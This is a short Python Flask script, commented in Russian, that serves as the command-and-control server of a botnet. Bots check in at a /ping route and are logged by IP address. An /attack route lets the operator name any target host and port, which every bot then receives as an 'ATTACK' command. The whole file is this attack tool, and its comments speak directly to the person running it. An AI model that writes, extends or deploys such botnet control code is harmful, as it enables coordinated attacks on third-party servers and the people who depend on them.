from flask import Flask, request, jsonify
import threading
import time

app = Flask(__name__)

bots = []
current_command = "WAIT"

@app.route('/')
def home():
    # Сюда ты будешь заходить, чтобы проверить статус
    return f"C2 Online. Bots: {len(bots)}. Current command: {current_command}"

@app.route('/ping')
def ping():
    # Боты стучатся сюда, чтобы показать, что они живы
    ip = request.remote_addr
    if ip not in bots:
        bots.append(ip)
    return current_command

@app.route('/attack')
def attack():
    # Тут ты задаешь команду
    global current_command
    target = request.args.get('target')
    port = request.args.get('port', '80')
    if not target:
        return "No target", 400
    current_command = f"ATTACK {target} {port}"
    return jsonify({"status": "Command sent to all bots", "command": current_command})
